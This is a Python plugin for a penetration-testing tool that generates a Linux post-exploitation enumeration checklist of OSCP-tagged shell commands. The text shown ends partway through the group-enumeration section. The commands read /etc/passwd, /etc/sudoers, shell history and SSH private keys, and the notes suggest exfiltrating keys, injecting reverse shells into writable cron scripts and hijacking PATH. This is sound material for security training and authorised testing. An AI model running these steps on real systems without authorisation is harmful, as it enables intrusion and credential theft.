"""
Linux System Enumeration Plugin

Generates comprehensive tasks for Linux system enumeration including:
- Environment variable analysis
- SUID/SGID binary discovery
- File permission enumeration
- Process and network analysis
- User and group enumeration
- Configuration file discovery
- Quick wins for privilege escalation
- Manual enumeration techniques

Extracted from HackTricks:
- linux-hardening/linux-environment-variables.md
- linux-hardening/useful-linux-commands.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxEnumerationPlugin(ServicePlugin):
    """
    Linux post-exploitation enumeration plugin

    Triggers on SSH access or shell access to Linux systems.
    Provides comprehensive enumeration checklist for privilege escalation,
    information gathering, and system reconnaissance.
    """

    @property
    def name(self) -> str:
        return "linux-enumeration"

    @property
    def default_ports(self) -> List[int]:
        return [22]  # SSH as primary trigger

    @property
    def service_names(self) -> List[str]:
        return ['ssh', 'linux', 'unix']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect Linux systems via SSH or explicit Linux service detection

        This plugin triggers when:
        - SSH service is detected
        - Service explicitly mentions Linux/Unix
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port')

        # Check for SSH service (primary indicator)
        if 'ssh' in service or port == 22:
            return True

        # Check for Linux/Unix indicators
        if any(indicator in product + extrainfo + service for indicator in
               ['linux', 'unix', 'ubuntu', 'debian', 'centos', 'redhat', 'fedora']):
            return True

        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect Linux enumeration activation from findings

        Activates on:
        - Linux OS detection (perfect match)
        - Unix OS detection (high confidence)
        - Linux shell obtained (high confidence)
        - Linux distro mentions (medium confidence)

        Returns:
            int: Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Linux OS detected
        if finding_type in [FindingTypes.OS_LINUX, FindingTypes.OS_UNIX]:
            logger.info(f"Linux enumeration activating: {finding_type} detected")
            return 95

        # High confidence - Shell obtained on Linux system
        if finding_type == FindingTypes.SHELL_OBTAINED:
            linux_hints = ['linux', 'ubuntu', 'debian', 'bash', '/bin/', '/etc/']
            if any(hint in description for hint in linux_hints):
                logger.info("Linux enumeration activating: Linux shell detected")
                return 90

        # High confidence - OS detected with Linux mention
        if finding_type == FindingTypes.OS_DETECTED:
            if 'linux' in description or 'unix' in description:
                return 85

        # Medium - Linux distros mentioned
        distros = ['ubuntu', 'debian', 'centos', 'redhat', 'fedora', 'kali', 'mint', 'arch', 'suse']
        if any(distro in description for distro in distros):
            logger.info(f"Linux enumeration activating: Distro detected in {description}")
            return 70

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate comprehensive Linux enumeration task tree

        Organized by enumeration phases:
        1. Quick Wins (SUID, environment, running processes)
        2. System Information (version, kernel, users)
        3. File System Enumeration (writable dirs, configs)
        4. Network Enumeration (connections, services)
        5. Advanced Techniques (grep patterns, data extraction)
        """
        version = service_info.get('version', '')
        product = service_info.get('product', 'Linux')
        extrainfo = service_info.get('extrainfo', '')

        tasks = {
            'id': f'linux-enum-{port}',
            'name': f'Linux System Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: Quick Wins ===
        tasks['children'].append(self._create_quick_wins_section(target, port))

        # === PHASE 2: Environment Analysis ===
        tasks['children'].append(self._create_environment_section(target, port))

        # === PHASE 3: SUID/SGID Enumeration ===
        tasks['children'].append(self._create_suid_sgid_section(target, port))

        # === PHASE 4: File System Enumeration ===
        tasks['children'].append(self._create_filesystem_section(target, port))

        # === PHASE 5: Network Enumeration ===
        tasks['children'].append(self._create_network_section(target, port))

        # === PHASE 6: User & Process Enumeration ===
        tasks['children'].append(self._create_user_process_section(target, port))

        # === PHASE 7: Data Extraction & Grep Patterns ===
        tasks['children'].append(self._create_data_extraction_section(target, port))

        # === PHASE 8: Privilege Escalation Checks ===
        tasks['children'].append(self._create_privesc_section(target, port))

        # === PHASE 9: Persistence & Cleanup ===
        tasks['children'].append(self._create_persistence_section(target, port))

        return tasks

    def _create_quick_wins_section(self, target: str, port: int) -> Dict[str, Any]:
        """Quick win enumeration tasks (< 5 minutes each)"""
        return {
            'id': f'quick-wins-{port}',
            'name': 'Quick Wins (Priority Tasks)',
            'type': 'parent',
            'children': [
                {
                    'id': f'check-sudo-{port}',
                    'name': 'Check Sudo Privileges',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo -l',
                        'description': 'List current user sudo privileges (may reveal instant privesc)',
                        'flag_explanations': {
                            '-l': 'List allowed commands for current user without executing'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'List of allowed commands appears',
                            'NOPASSWD entries (execute without password)',
                            'Specific binaries listed (check GTFOBins)'
                        ],
                        'failure_indicators': [
                            'User not in sudoers file',
                            'Password required and unknown',
                            'No sudo privileges'
                        ],
                        'next_steps': [
                            'If NOPASSWD binaries found, check https://gtfobins.github.io/',
                            'Test sudo commands: sudo <command>',
                            'Look for wildcard injection vulnerabilities'
                        ],
                        'alternatives': [
                            'Check /etc/sudoers: cat /etc/sudoers 2>/dev/null',
                            'Check sudo directory: ls -la /etc/sudoers.d/ 2>/dev/null'
                        ],
                        'estimated_time': '30 seconds',
                        'notes': 'First command to run - instant win if NOPASSWD found'
                    }
                },
                {
                    'id': f'find-suid-quick-{port}',
                    'name': 'Find SUID Binaries (Quick)',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -u=s -type f 2>/dev/null',
                        'description': 'Find all SUID binaries (may lead to privilege escalation)',
                        'flag_explanations': {
                            '/': 'Search from root directory',
                            '-perm -u=s': 'Find files with SUID bit set (runs as owner)',
                            '-type f': 'Only search for files (not directories)',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'List of SUID binaries returned',
                            'Unusual binaries found (not in /bin, /usr/bin)',
                            'Custom applications with SUID'
                        ],
                        'failure_indicators': [
                            'Empty output (unlikely)',
                            'Permission denied on all paths',
                            'Only standard system binaries'
                        ],
                        'next_steps': [
                            'Cross-reference findings with https://gtfobins.github.io/',
                            'Check each unusual binary: ls -la /path/to/binary',
                            'Test exploitation: strings, ltrace, strace on binary'
                        ],
                        'alternatives': [
                            'Alternative syntax: find / -perm -4000 2>/dev/null',
                            'With details: find / -user root -perm -4000 -exec ls -ldb {} \\;',
                            'Search specific dirs: find /usr/local -perm -u=s 2>/dev/null'
                        ],
                        'estimated_time': '2-5 minutes',
                        'notes': 'Critical for privesc. Focus on non-standard binaries.'
                    }
                },
                {
                    'id': f'check-kernel-{port}',
                    'name': 'Check Kernel Version',
                    'type': 'command',
                    'metadata': {
                        'command': 'uname -a',
                        'description': 'Get kernel version for exploit research',
                        'flag_explanations': {
                            '-a': 'All system information (kernel, hostname, architecture)'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Kernel version displayed',
                            'Architecture identified (x86_64, i686)',
                            'Distribution info visible'
                        ],
                        'failure_indicators': [
                            'Command not found (very rare)',
                            'Restricted shell environment'
                        ],
                        'next_steps': [
                            'Search for kernel exploits: searchsploit <kernel_version>',
                            'Check Linux Exploit Suggester',
                            'Research CVEs for specific kernel'
                        ],
                        'alternatives': [
                            'cat /proc/version',
                            'cat /etc/os-release',
                            'lsb_release -a',
                            'hostnamectl (systemd systems)'
                        ],
                        'estimated_time': '10 seconds',
                        'notes': 'Essential for exploit research. Document exact version.'
                    }
                },
                {
                    'id': f'check-cron-{port}',
                    'name': 'Check Cron Jobs',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/crontab; ls -la /etc/cron.*; crontab -l',
                        'description': 'Find scheduled tasks (may be writable for privesc)',
                        'flag_explanations': {
                            'cat /etc/crontab': 'View system-wide cron jobs',
                            'ls -la /etc/cron.*': 'List cron directories (hourly, daily, weekly)',
                            'crontab -l': 'List current user cron jobs',
                            '-l': 'List mode for crontab'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'Cron jobs listed',
                            'Scripts referenced in cron',
                            'World-writable scripts found'
                        ],
                        'failure_indicators': [
                            'No crontab for user',
                            'Permission denied on /etc/crontab',
                            'Empty cron directories'
                        ],
                        'next_steps': [
                            'Check permissions on referenced scripts: ls -la /path/to/script',
                            'If writable, inject reverse shell',
                            'Monitor cron execution: watch -n 1 ps aux'
                        ],
                        'alternatives': [
                            'for user in $(cat /etc/passwd | cut -d: -f1); do crontab -u $user -l 2>/dev/null; done',
                            'cat /var/spool/cron/crontabs/* 2>/dev/null',
                            'systemctl list-timers (systemd)'
                        ],
                        'estimated_time': '1-2 minutes',
                        'notes': 'Look for writable scripts run by root'
                    }
                }
            ]
        }

    def _create_environment_section(self, target: str, port: int) -> Dict[str, Any]:
        """Environment variable analysis tasks"""
        return {
            'id': f'env-analysis-{port}',
            'name': 'Environment Variable Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'list-env-vars-{port}',
                    'name': 'List Environment Variables',
                    'type': 'command',
                    'metadata': {
                        'command': 'env; set; printenv',
                        'description': 'List all environment variables (may contain credentials, paths)',
                        'flag_explanations': {
                            'env': 'Display environment variables exported to child processes',
                            'set': 'Display all shell variables (local and global)',
                            'printenv': 'Alternative to env command'
                        },
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'List of variables displayed',
                            'PATH variable visible',
                            'Custom variables found'
                        ],
                        'failure_indicators': [
                            'Command not found (restricted shell)',
                            'Empty output (unlikely)'
                        ],
                        'next_steps': [
                            'Check PATH for writable directories',
                            'Look for credentials in variables',
                            'Note custom application variables'
                        ],
                        'alternatives': [
                            'cat /proc/$$/environ | tr "\\0" "\\n"',
                            'cat /proc/self/environ | tr "\\0" "\\n"',
                            'python -c "import os; print(os.environ)"'
                        ],
                        'estimated_time': '30 seconds',
                        'notes': 'Look for: HISTFILE, HISTSIZE, http_proxy, SSL_CERT paths'
                    }
                },
                {
                    'id': f'check-path-{port}',
                    'name': 'Analyze PATH Variable',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo $PATH | tr ":" "\\n"; for dir in $(echo $PATH | tr ":" " "); do ls -ld $dir 2>/dev/null; done',
                        'description': 'Check PATH directories for writable locations (PATH hijacking)',
                        'flag_explanations': {
                            'echo $PATH': 'Display PATH variable',
                            'tr ":" "\\n"': 'Translate colons to newlines (one dir per line)',
                            'ls -ld $dir': 'List directory permissions',
                            '-l': 'Long format (shows permissions)',
                            '-d': 'Directory itself (not contents)'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'PATH directories listed with permissions',
                            'Writable directory found in PATH',
                            'Current directory (.) in PATH'
                        ],
                        'failure_indicators': [
                            'All directories root-owned and not writable',
                            'PATH not set'
                        ],
                        'next_steps': [
                            'If writable dir found, create malicious binary',
                            'Name binary same as common command (ls, ps, etc.)',
                            'Wait for root/user to execute'
                        ],
                        'alternatives': [
                            'Manual check: ls -la /usr/local/bin /usr/bin /bin',
                            'find $(echo $PATH | tr ":" " ") -type d -writable 2>/dev/null'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Writable PATH directory = instant privesc opportunity'
                    }
                },
                {
                    'id': f'check-history-{port}',
                    'name': 'Check Command History',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat ~/.bash_history; cat ~/.zsh_history; history',
                        'description': 'Read command history (may reveal credentials, attack paths)',
                        'flag_explanations': {
                            '~/.bash_history': 'Bash shell command history file',
                            '~/.zsh_history': 'Zsh shell command history file',
                            'history': 'Display current session history'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Command history displayed',
                            'Credentials visible in commands',
                            'Previous attack patterns visible'
                        ],
                        'failure_indicators': [
                            'History file empty',
                            'HISTSIZE=0 or HISTFILESIZE=0',
                            'History disabled'
                        ],
                        'next_steps': [
                            'Search for passwords: grep -i "passw" ~/.bash_history',
                            'Search for credentials: grep -E "user|login|auth" ~/.bash_history',
                            'Note interesting directories accessed'
                        ],
                        'alternatives': [
                            'Check all users: cat /home/*/.bash_history 2>/dev/null',
                            'Check root: cat /root/.bash_history 2>/dev/null',
                            'Check other shells: cat ~/.sh_history ~/.ksh_history 2>/dev/null'
                        ],
                        'estimated_time': '1-2 minutes',
                        'notes': 'Gold mine for credentials. Check HISTFILESIZE variable first.'
                    }
                },
                {
                    'id': f'check-ssh-keys-{port}',
                    'name': 'Find SSH Keys',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name "id_rsa*" -o -name "id_dsa*" -o -name "*.pem" 2>/dev/null',
                        'description': 'Locate SSH private keys (lateral movement, privesc)',
                        'flag_explanations': {
                            '-name "id_rsa*"': 'Find RSA private keys',
                            '-o': 'OR operator (find files matching any pattern)',
                            '-name "id_dsa*"': 'Find DSA private keys',
                            '-name "*.pem"': 'Find PEM certificate files'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM', 'LATERAL_MOVEMENT'],
                        'success_indicators': [
                            'SSH key files found',
                            'Keys in unexpected locations',
                            'Keys readable by current user'
                        ],
                        'failure_indicators': [
                            'No keys found',
                            'All keys permission denied'
                        ],
                        'next_steps': [
                            'Copy keys to attacker machine',
                            'Check authorized_keys: cat ~/.ssh/authorized_keys',
                            'Try keys for other users: ssh -i key user@localhost'
                        ],
                        'alternatives': [
                            'Check home dirs: ls -la /home/*/.ssh/',
                            'Check root: ls -la /root/.ssh/',
                            'find / -name "authorized_keys" 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Always try found keys for lateral movement'
                    }
                }
            ]
        }

    def _create_suid_sgid_section(self, target: str, port: int) -> Dict[str, Any]:
        """SUID/SGID binary enumeration (privilege escalation focus)"""
        return {
            'id': f'suid-sgid-{port}',
            'name': 'SUID/SGID Binary Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'find-suid-detailed-{port}',
                    'name': 'Find SUID Binaries (Detailed)',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -u=s -type f -exec ls -ldb {} \\; 2>/dev/null',
                        'description': 'Find SUID binaries with detailed permissions',
                        'flag_explanations': {
                            '-perm -u=s': 'SUID bit set (executes as file owner)',
                            '-type f': 'Files only',
                            '-exec ls -ldb {} \\;': 'Execute ls on each result',
                            'ls -ldb': 'Long format, directory, no owner group'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'Binaries listed with permissions',
                            'Owner shown (target root-owned)',
                            'Non-standard binaries found'
                        ],
                        'failure_indicators': [
                            'Only standard system binaries',
                            'No unusual SUID binaries'
                        ],
                        'next_steps': [
                            'Focus on non-standard binaries',
                            'Check GTFOBins: https://gtfobins.github.io/',
                            'Test binary: strings /path/to/binary',
                            'Reverse engineer if needed: ltrace, strace'
                        ],
                        'alternatives': [
                            'find / -perm -4000 -ls 2>/dev/null',
                            'find / -user root -perm -4000 2>/dev/null'
                        ],
                        'estimated_time': '3-5 minutes',
                        'notes': 'Focus on: custom apps, unusual locations, version-specific exploits'
                    }
                },
                {
                    'id': f'find-sgid-{port}',
                    'name': 'Find SGID Binaries',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -g=s -type f -exec ls -ldb {} \\; 2>/dev/null',
                        'description': 'Find SGID binaries (executes as group owner)',
                        'flag_explanations': {
                            '-perm -g=s': 'SGID bit set (executes as file group)',
                            '-type f': 'Files only',
                            '-exec ls -ldb {} \\;': 'List each result with details'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'SGID binaries listed',
                            'Group ownership visible',
                            'Non-standard SGID binaries found'
                        ],
                        'failure_indicators': [
                            'Only standard system binaries',
                            'No exploitable SGID binaries'
                        ],
                        'next_steps': [
                            'Check group memberships: groups',
                            'If in target group, exploit SGID binary',
                            'Look for write access to group files'
                        ],
                        'alternatives': [
                            'find / -perm -2000 -ls 2>/dev/null',
                            'find / -perm -g=s -user root 2>/dev/null'
                        ],
                        'estimated_time': '3-5 minutes',
                        'notes': 'Less common than SUID but still valuable for privesc'
                    }
                },
                {
                    'id': f'find-both-suid-sgid-{port}',
                    'name': 'Find Both SUID and SGID',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -6000 -type f -exec ls -ldb {} \\; 2>/dev/null',
                        'description': 'Find binaries with both SUID and SGID set (rare, investigate)',
                        'flag_explanations': {
                            '-perm -6000': 'Both SUID (4000) and SGID (2000) bits set',
                            '6000': 'Octal: 4000 (SUID) + 2000 (SGID)'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'Binaries with both bits found',
                            'Unusual permission combinations'
                        ],
                        'failure_indicators': [
                            'No binaries found (common)',
                            'Only standard system tools'
                        ],
                        'next_steps': [
                            'Investigate any findings thoroughly',
                            'Check binary functionality: --help, man page',
                            'Test for vulnerabilities'
                        ],
                        'alternatives': [
                            'find / \\( -perm -4000 -o -perm -2000 \\) -exec ls -ldb {} \\; 2>/dev/null'
                        ],
                        'estimated_time': '3-5 minutes',
                        'notes': 'Rare but highly suspicious. Always investigate.'
                    }
                }
            ]
        }

    def _create_filesystem_section(self, target: str, port: int) -> Dict[str, Any]:
        """File system enumeration tasks"""
        return {
            'id': f'filesystem-{port}',
            'name': 'File System Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'find-writable-dirs-{port}',
                    'name': 'Find Writable Directories',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type d -writable 2>/dev/null | grep -v "^/proc" | grep -v "^/dev" | grep -v "^/run" | head -20',
                        'description': 'Find writable directories for file upload, persistence',
                        'flag_explanations': {
                            '-type d': 'Directories only',
                            '-writable': 'Current user has write permission',
                            'grep -v "^/proc"': 'Exclude /proc (pseudo-filesystem)',
                            'head -20': 'Show first 20 results only'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Writable directories found',
                            'Directories in interesting locations (/etc, /usr, /opt)',
                            'Web directories writable'
                        ],
                        'failure_indicators': [
                            'Only /tmp and /dev/shm writable (expected)',
                            'No unusual writable directories'
                        ],
                        'next_steps': [
                            'Upload tools to writable directories',
                            'Create persistence scripts',
                            'Check if directories in PATH for hijacking'
                        ],
                        'alternatives': [
                            'find / -type d -perm -222 2>/dev/null',
                            'find /etc /var /usr -writable 2>/dev/null',
                            'Manual: ls -la /tmp /var/tmp /dev/shm'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Focus on non-standard locations. /tmp and /dev/shm always writable.'
                    }
                },
                {
                    'id': f'find-writable-files-{port}',
                    'name': 'Find World-Writable Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type f -perm -o+w 2>/dev/null | grep -v "^/proc" | grep -v "^/dev" | head -30',
                        'description': 'Find world-writable files (modify for privesc, backdoor)',
                        'flag_explanations': {
                            '-type f': 'Files only',
                            '-perm -o+w': 'Others (world) have write permission',
                            'o+w': 'Other users can write'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'Writable files found',
                            'System files writable (dangerous)',
                            'Scripts run by cron/services writable'
                        ],
                        'failure_indicators': [
                            'No unexpected writable files',
                            'Only temporary files writable'
                        ],
                        'next_steps': [
                            'Check if files executed by root/services',
                            'Modify scripts to inject reverse shell',
                            'Check file ownership: ls -la /path/to/file'
                        ],
                        'alternatives': [
                            'find / -perm -2 -type f 2>/dev/null',
                            'find /etc -writable -type f 2>/dev/null'
                        ],
                        'estimated_time': '3-5 minutes',
                        'notes': 'World-writable files in /etc or scripts run by root = privesc'
                    }
                },
                {
                    'id': f'find-owned-files-{port}',
                    'name': 'Find Files Owned by Current User',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -user $(whoami) -type f 2>/dev/null | grep -v "^/proc" | head -50',
                        'description': 'Find files owned by current user (understand permissions)',
                        'flag_explanations': {
                            '-user $(whoami)': 'Files owned by current user',
                            '$(whoami)': 'Command substitution - current username',
                            '-type f': 'Files only'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'User-owned files listed',
                            'Files in unexpected locations',
                            'Sensitive files owned'
                        ],
                        'failure_indicators': [
                            'Only home directory files',
                            'No unusual ownership'
                        ],
                        'next_steps': [
                            'Check if owned files executed by others',
                            'Look for config files',
                            'Search for credentials in owned files'
                        ],
                        'alternatives': [
                            'find / -user $USER -type f 2>/dev/null',
                            'find /home /opt /var -user $(whoami) 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Helps understand user permissions and attack surface'
                    }
                },
                {
                    'id': f'find-recent-files-{port}',
                    'name': 'Find Recently Modified Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type f -mtime -7 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | head -50',
                        'description': 'Find files modified in last 7 days (recent activity)',
                        'flag_explanations': {
                            '-mtime -7': 'Modified within last 7 days',
                            '-7': 'Negative number = within last N days',
                            'grep -v "^/sys"': 'Exclude /sys pseudo-filesystem'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Recently modified files listed',
                            'User activity visible',
                            'New files discovered'
                        ],
                        'failure_indicators': [
                            'Only system files',
                            'No user activity'
                        ],
                        'next_steps': [
                            'Check content of recent files',
                            'Look for credentials, notes',
                            'Identify active applications'
                        ],
                        'alternatives': [
                            'find / -mtime -1 (last 24 hours)',
                            'find / -mmin -60 (last 60 minutes)',
                            'ls -ltr /home/*/  (show recent in home dirs)'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Useful for understanding recent system activity'
                    }
                },
                {
                    'id': f'find-config-files-{port}',
                    'name': 'Find Configuration Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -50',
                        'description': 'Locate configuration files (may contain credentials, settings)',
                        'flag_explanations': {
                            '-name "*.conf"': 'Find .conf files',
                            '-o': 'OR operator',
                            '-name "*.config"': 'Find .config files',
                            '-name "*.cfg"': 'Find .cfg files'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Config files found',
                            'Readable configs',
                            'Application configs discovered'
                        ],
                        'failure_indicators': [
                            'All configs permission denied',
                            'No interesting configs found'
                        ],
                        'next_steps': [
                            'Read configs: cat /path/to/config',
                            'Search for passwords: grep -i "pass" *.conf',
                            'Search for credentials: grep -i "user" *.conf'
                        ],
                        'alternatives': [
                            'locate "*.conf" (if updatedb run)',
                            'find /etc -name "*.conf" 2>/dev/null',
                            'find /opt -name "*.conf" 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Application configs often contain credentials'
                    }
                }
            ]
        }

    def _create_network_section(self, target: str, port: int) -> Dict[str, Any]:
        """Network enumeration tasks"""
        return {
            'id': f'network-enum-{port}',
            'name': 'Network Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'check-network-connections-{port}',
                    'name': 'Check Active Network Connections',
                    'type': 'command',
                    'metadata': {
                        'command': 'netstat -tunlp 2>/dev/null || ss -tunlp 2>/dev/null',
                        'description': 'List active network connections and listening services',
                        'flag_explanations': {
                            '-t': 'TCP connections',
                            '-u': 'UDP connections',
                            '-n': 'Numeric addresses (no DNS resolution)',
                            '-l': 'Listening sockets only',
                            '-p': 'Show process name/PID',
                            'ss': 'Modern alternative to netstat'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'List of connections displayed',
                            'Listening services identified',
                            'Process PIDs visible'
                        ],
                        'failure_indicators': [
                            'Commands not found',
                            'Permission denied (need root for -p)'
                        ],
                        'next_steps': [
                            'Identify localhost-only services (127.0.0.1)',
                            'Port forward localhost services to attacker',
                            'Research unfamiliar services'
                        ],
                        'alternatives': [
                            'lsof -i (list open network files)',
                            'lsof -i :PORT (check specific port)',
                            'cat /proc/net/tcp (raw TCP connections)'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Look for localhost-only services for port forwarding'
                    }
                },
                {
                    'id': f'check-listening-ports-{port}',
                    'name': 'Find Listening Ports',
                    'type': 'command',
                    'metadata': {
                        'command': 'lsof -i -P -n 2>/dev/null | grep LISTEN',
                        'description': 'List all listening ports with process info',
                        'flag_explanations': {
                            '-i': 'Internet files (network connections)',
                            '-P': 'Port numbers (no service name lookup)',
                            '-n': 'No hostname resolution',
                            'grep LISTEN': 'Filter for listening sockets only'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Listening ports listed',
                            'Process names visible',
                            'Internal services discovered'
                        ],
                        'failure_indicators': [
                            'lsof not installed',
                            'Permission denied',
                            'No network services'
                        ],
                        'next_steps': [
                            'Connect to localhost services',
                            'Set up SSH port forwarding',
                            'Test for local exploits'
                        ],
                        'alternatives': [
                            'netstat -tulpn | grep LISTEN',
                            'ss -tulpn | grep LISTEN',
                            'fuser -n tcp PORT (check specific port)'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Internal services often have weaker security'
                    }
                },
                {
                    'id': f'check-arp-neighbors-{port}',
                    'name': 'Check ARP Table',
                    'type': 'command',
                    'metadata': {
                        'command': 'arp -a; ip neigh',
                        'description': 'View ARP cache (discover network neighbors)',
                        'flag_explanations': {
                            'arp -a': 'Display ARP cache',
                            'ip neigh': 'Modern alternative (iproute2)',
                            '-a': 'All entries'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM', 'LATERAL_MOVEMENT'],
                        'success_indicators': [
                            'Network neighbors listed',
                            'IP/MAC mappings visible',
                            'Multiple hosts discovered'
                        ],
                        'failure_indicators': [
                            'Empty ARP cache',
                            'Commands not found',
                            'Single isolated host'
                        ],
                        'next_steps': [
                            'Scan discovered hosts: nmap <IP>',
                            'Attempt lateral movement',
                            'Check routing: ip route'
                        ],
                        'alternatives': [
                            'cat /proc/net/arp',
                            'ip -s -s neigh show (detailed stats)'
                        ],
                        'estimated_time': '30 seconds',
                        'notes': 'Helps map internal network topology'
                    }
                },
                {
                    'id': f'check-routing-{port}',
                    'name': 'Check Routing Table',
                    'type': 'command',
                    'metadata': {
                        'command': 'ip route; route -n; netstat -rn',
                        'description': 'View routing table (identify network segments)',
                        'flag_explanations': {
                            'ip route': 'Modern routing table display',
                            'route -n': 'Legacy routing table (numeric)',
                            'netstat -rn': 'Alternative routing display',
                            '-n': 'Numeric (no DNS lookups)',
                            '-r': 'Routing table'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Routes displayed',
                            'Multiple network segments visible',
                            'Default gateway identified'
                        ],
                        'failure_indicators': [
                            'Commands not found',
                            'Single network only'
                        ],
                        'next_steps': [
                            'Identify pivot opportunities',
                            'Scan additional networks',
                            'Set up pivoting/tunneling'
                        ],
                        'alternatives': [
                            'cat /proc/net/route'
                        ],
                        'estimated_time': '30 seconds',
                        'notes': 'Essential for pivoting and lateral movement'
                    }
                }
            ]
        }

    def _create_user_process_section(self, target: str, port: int) -> Dict[str, Any]:
        """User and process enumeration tasks"""
        return {
            'id': f'user-process-{port}',
            'name': 'User & Process Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'enumerate-users-{port}',
                    'name': 'Enumerate Users',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/passwd; awk -F: \'$3 >= 1000 {print $1}\' /etc/passwd',
                        'description': 'List all users and filter for real users (UID >= 1000)',
                        'flag_explanations': {
                            'cat /etc/passwd': 'Display all user accounts',
                            'awk -F:': 'Use colon as field separator',
                            '$3 >= 1000': 'UID field >= 1000 (real users, not system)',
                            'print $1': 'Print username field'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'User list displayed',
                            'Real users identified',
                            'Home directories noted'
                        ],
                        'failure_indicators': [
                            'Permission denied (very rare)',
                            'No real users (minimal system)'
                        ],
                        'next_steps': [
                            'Check home directories: ls -la /home/*',
                            'Look for .ssh directories',
                            'Check for reused passwords'
                        ],
                        'alternatives': [
                            'cut -d: -f1 /etc/passwd (just usernames)',
                            'getent passwd (includes LDAP/NIS users)',
                            'compgen -u (bash builtin)'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'UID < 1000 usually system accounts. Focus on UID >= 1000.'
                    }
                },
                {
                    'id': f'enumerate-groups-{port}',
                    'name': 'Enumerate Groups',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/group; groups; id',
                        'description': 'List all groups and current user group memberships',
                        'flag_explanations': {
                            'cat /etc/group': 'Display all groups',
                            'groups': 'Show current user groups',
                            'id': 'Show UID, GID, and all groups'
                        },
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Group list displayed',
                            'Current user groups shown',
                            'Privileged groups identified (sudo, admin, docker)'
                        ],
                        'failure_indicators': [
                            'Permission denied (rare)',
                            'No interesting group memberships'
